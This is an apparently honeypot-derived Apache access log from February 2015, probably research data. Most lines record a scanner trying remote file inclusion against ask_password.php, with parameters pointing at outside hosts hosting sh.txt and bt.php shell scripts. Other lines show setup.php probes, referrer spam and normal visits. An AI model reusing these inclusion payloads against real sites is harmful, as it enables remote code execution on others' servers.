176.31.252.38 - - [15/Feb/2015:20:19:58 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
176.31.252.38 - - [15/Feb/2015:20:19:58 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
176.31.252.38 - - [15/Feb/2015:20:19:59 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
176.31.252.38 - - [15/Feb/2015:20:34:08 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [15/Feb/2015:20:34:09 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [15/Feb/2015:20:34:10 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [15/Feb/2015:20:34:11 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [15/Feb/2015:20:34:11 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [15/Feb/2015:20:34:12 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [15/Feb/2015:20:34:12 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [15/Feb/2015:20:34:13 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [15/Feb/2015:20:36:16 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [15/Feb/2015:20:36:17 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [15/Feb/2015:20:36:17 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [15/Feb/2015:20:36:18 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [15/Feb/2015:20:36:18 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [15/Feb/2015:20:36:20 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [15/Feb/2015:20:36:20 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [15/Feb/2015:20:36:21 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
207.46.13.22 - - [15/Feb/2015:20:49:57 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)" 
178.137.92.19 - - [15/Feb/2015:21:16:32 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://w7s.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)" 
178.137.92.19 - - [15/Feb/2015:21:16:33 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://w7s.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)" 
178.137.92.19 - - [15/Feb/2015:21:16:34 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://w7s.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)" 
104.130.161.115 - - [15/Feb/2015:23:21:37 -0800] "GET /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 301 524 "-" "Tornado-Async-Client" 
104.130.161.115 - - [15/Feb/2015:23:21:37 -0800] "GET /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [15/Feb/2015:23:21:38 -0800] "GET /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 301 524 "-" "Tornado-Async-Client" 
104.130.161.114 - - [15/Feb/2015:23:21:38 -0800] "GET /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [15/Feb/2015:23:21:38 -0800] "GET /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 301 524 "-" "Tornado-Async-Client" 
104.130.161.115 - - [15/Feb/2015:23:21:38 -0800] "GET /honeypot////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [15/Feb/2015:23:21:39 -0800] "GET /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 301 524 "-" "Tornado-Async-Client" 
104.130.161.114 - - [15/Feb/2015:23:21:39 -0800] "GET /honeypot////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [15/Feb/2015:23:21:42 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 301 504 "-" "Tornado-Async-Client" 
104.130.161.117 - - [15/Feb/2015:23:21:42 -0800] "GET /bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [15/Feb/2015:23:21:42 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 301 504 "-" "Tornado-Async-Client" 
104.130.161.114 - - [15/Feb/2015:23:21:42 -0800] "GET /bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.113 - - [15/Feb/2015:23:21:43 -0800] "GET ////bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 301 504 "-" "Tornado-Async-Client" 
104.130.161.113 - - [15/Feb/2015:23:21:43 -0800] "GET /bbs/skin/ggambo6000_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [15/Feb/2015:23:21:44 -0800] "GET ////bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 301 504 "-" "Tornado-Async-Client" 
104.130.161.114 - - [15/Feb/2015:23:21:44 -0800] "GET /bbs/skin/ggambo5100_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
194.244.43.243 - - [16/Feb/2015:00:21:42 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18" 
194.244.43.243 - - [16/Feb/2015:00:21:43 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18" 
194.244.43.243 - - [16/Feb/2015:00:21:43 -0800] "GET / HTTP/1.1" 200 6787 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4" 
194.244.43.243 - - [16/Feb/2015:00:21:44 -0800] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "com.apple.WebKit.WebContent/10600.3.18 CFNetwork/720.2.4 Darwin/14.1.0 (x86_64)" 
194.244.43.243 - - [16/Feb/2015:00:21:44 -0800] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "com.apple.WebKit.WebContent/10600.3.18 CFNetwork/720.2.4 Darwin/14.1.0 (x86_64)" 
212.131.240.154 - - [16/Feb/2015:00:43:58 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
212.131.240.154 - - [16/Feb/2015:00:43:59 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 206 634 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
